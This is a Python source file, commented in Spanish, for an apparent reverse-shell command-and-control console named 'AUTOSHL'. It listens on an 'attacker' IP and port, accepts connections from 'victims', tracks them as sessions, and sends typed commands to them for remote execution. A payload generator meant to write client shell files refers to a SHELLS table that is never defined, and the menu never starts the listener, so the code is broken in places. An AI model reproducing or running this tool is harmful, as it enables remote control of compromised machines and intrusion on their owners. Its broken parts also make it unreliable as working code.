import os
import socket
import subprocess
import platform
import re
import threading

# Colores para terminal (Windows no los soporta por defecto)
if platform.system() == "Windows":
    RED, GREEN, CYAN, RESET = "", "", "", ""
else:
    RED, GREEN, CYAN, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[0m"

# Variable para almacenar las sesiones activas
sessions = {}

# Función para mostrar el banner
def banner():
    print(f"""{CYAN}
 █████╗ ██╗   ██╗████████╗ ██████╗ ███████╗██╗  ██╗██╗     
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔════╝██║  ██║██║     
███████║██║   ██║   ██║   ██║   ██║███████╗███████║██║     
██╔══██║██║   ██║   ██║   ██║   ██║╚════██║██╔══██║██║     
██║  ██║╚██████╔╝   ██║   ╚██████╔╝███████║██║  ██║███████╗
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝
{RESET}---- By: MARH ------------------------------------------- {RESET}""")

# Función para gestionar la entrada del usuario
def get_option(prompt, valid_options):
    while True:
        choice = input(prompt).strip()
        if choice in valid_options:
            return choice
        print(f"{RED}[!] Opción inválida. Inténtalo de nuevo.{RESET}")

# Función para validar IP
def validate_ip(ip):
    return re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", ip)

# Función para validar puerto
def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

# Función para validar directorios
def validate_path(path):
    path = os.path.expanduser(path)  # Expande rutas como ~/Desktop
    return os.path.isdir(path)

# Función para generar la shell
def generate_shell(os_choice, lang_choice, attacker_ip, port, save_path):
    if lang_choice in SHELLS[os_choice]:
        filename, shell_content = SHELLS[os_choice][lang_choice]
        file_path = os.path.join(save_path, filename)

        with open(file_path, "w") as f:
            f.write(shell_content.format(attacker_ip, port))

        print(f"{GREEN}✅ Cliente guardado en: {file_path}{RESET}")
    else:
        print(f"{RED}❌ Error al generar los archivos. Verifica las opciones.{RESET}")

# Función para listar sesiones activas
def list_sessions():
    if not sessions:
        print(f"{RED}[!] No hay sesiones activas.{RESET}")
        return

    # Títulos de las columnas
    print(f"{CYAN}{'ID':<5}{'IP VICTIMA':<20}{'SO VICTIMA':<15}{'ESTADO':<10}{RESET}")
    
    for session_id, session in sessions.items():
        estado = "Conectado" if session["estado"] == "conectado" else "Desconectado"
        print(f"{session_id:<5}{session['ip']:<20}{session['os']:<15}{estado:<10}")

# Función para usar una sesión
def use_session(session_id):
    if session_id in sessions:
        print(f"{GREEN}[+] Usando la sesión {session_id}...{RESET}")
        # Aquí puedes realizar las interacciones con la sesión
    else:
        print(f"{RED}[!] Sesión {session_id} no encontrada.{RESET}")

# Función para eliminar una sesión
def kill_session(session_id):
    if session_id in sessions:
        del sessions[session_id]
        print(f"{GREEN}[+] Sesión {session_id} eliminada correctamente.{RESET}")
    else:
        print(f"{RED}[!] Sesión {session_id} no encontrada.{RESET}")

# Función para aceptar la conexión de una víctima y crear una sesión
def handle_connection(conn, addr, session_id, attacker_ip, port):
    print(f"✅ Conexión recibida de {addr}")
    # Guarda la sesión activa
    victim_os = "Windows"  # O se puede determinar dinámicamente
    sessions[session_id] = {"ip": addr[0], "os": victim_os, "estado": "conectado"}

    # Interactuar con la víctima
    while True:
        cmd = input(f"{attacker_ip} > ")

        if cmd.lower() == "exit":
            conn.send(cmd.encode())
            break

        conn.send(cmd.encode())
        response = conn.recv(4096).decode()
        print(response)

    conn.close()
    # Cambiar el estado a "Desconectado" cuando la conexión se cierre
    sessions[session_id]["estado"] = "desconectado"

# Función para iniciar el servidor
def start_server(attacker_ip, port):
    # Crear socket para escuchar conexiones
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((attacker_ip, port))
    s.listen(5)  # Escuchar hasta 5 conexiones
    print(f"📡 Esperando conexión en {attacker_ip}:{port}...")

    session_id = 1  # Usamos un ID incremental para cada sesión
    while True:
        # Aceptar la conexión de la víctima
        conn, addr = s.accept()

        # Crear un hilo para manejar esta conexión
        threading.Thread(target=handle_connection, args=(conn, addr, session_id, attacker_ip, port)).start()

        session_id += 1  # Incrementar el ID para la siguiente sesión

# Función principal que interactúa con el usuario
def main():
    banner()

    while True:
        print(f"{CYAN}\nComandos disponibles:{RESET}")
        print("1️⃣ list sessions")
        print("2️⃣ use session <ID>")
        print("3️⃣ kill session <ID>")
        print("4️⃣ exit")

        cmd = input(f"{CYAN}[+] Ingrese un comando: {RESET}")

        if cmd == "list sessions":
            list_sessions()

        elif cmd.startswith("use session"):
            session_id = cmd.split()[-1]
            use_session(session_id)

        elif cmd.startswith("kill session"):
            session_id = cmd.split()[-1]
            kill_session(session_id)

        elif cmd.lower() == "exit":
            print(f"{GREEN}[+] Saliendo...{RESET}")
            break

        else:
            print(f"{RED}[!] Comando no válido.{RESET}")


if __name__ == "__main__":
    main()
